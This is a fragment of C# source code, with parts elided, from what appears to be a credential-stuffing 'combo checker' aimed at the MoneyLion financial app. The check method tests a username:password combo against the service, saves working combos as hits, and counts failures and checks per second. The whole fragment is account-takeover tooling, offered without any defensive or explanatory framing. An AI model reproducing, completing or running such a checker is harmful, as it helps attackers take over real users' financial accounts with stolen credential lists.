        ...
        public static bool check(string combo)
        {
            try
            {
                ...
                if (str3.Contains("{\"code\":\"200\",\"message\":\"OK\"}"))
                {
                    ...
                    Program.Save(combo, "MoneyLion VM");
                    return true;
                }
                else if (str3.Contains("{\"code\":\"DA004\"}"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
